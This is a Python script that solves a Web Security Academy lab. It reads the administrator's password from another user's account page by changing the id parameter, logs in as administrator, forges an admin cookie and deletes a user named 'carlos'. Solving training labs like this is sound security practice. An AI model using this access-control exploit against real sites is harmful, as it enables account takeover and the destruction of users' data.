import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: User ID controlled by request parameter with data leakage in redirect')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# GET ADMINISTRATOR PASSWORD
r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account?id=administrator")
password = re.findall(r"value='(.*?)'", r.text)[0]

# AUTH AS ADMINISTRATOR
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
headers = {"Cookie": f"session={r.cookies.get('session')}"}
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"administrator","password":password}, allow_redirects=False)
administrator = r.cookies.get('session')
headers = {"Cookie":f"Admin=true;session={administrator}"}

# DELETE CARLOS
requests.get("https://" + lab.id + ".web-security-academy.net/admin/delete?username=carlos", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")